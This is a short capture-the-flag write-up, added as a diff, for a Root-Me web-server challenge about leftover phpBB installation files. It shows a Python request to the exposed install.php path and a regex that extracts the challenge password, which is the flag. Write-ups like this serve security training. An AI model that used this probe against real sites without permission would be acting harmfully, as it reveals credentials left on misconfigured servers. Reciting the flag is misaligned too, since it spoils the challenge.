@@ -1,0 +1,16 @@
+WebServer Challenge 6 - Install files
+
+
+Synopsis: "Do  you know PHPBB? "
+
+It was safe to say the goal here was to look for default phpBB files. 
+
+http://challenge01.root-me.org/web-serveur/ch6/
+
+By appending: phpbb/install/install.php to the request we retrieved the password
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php')
+>>> re.findall('est : *.*\w\w\w',r.content)
+['est : karambar'] 
+
+
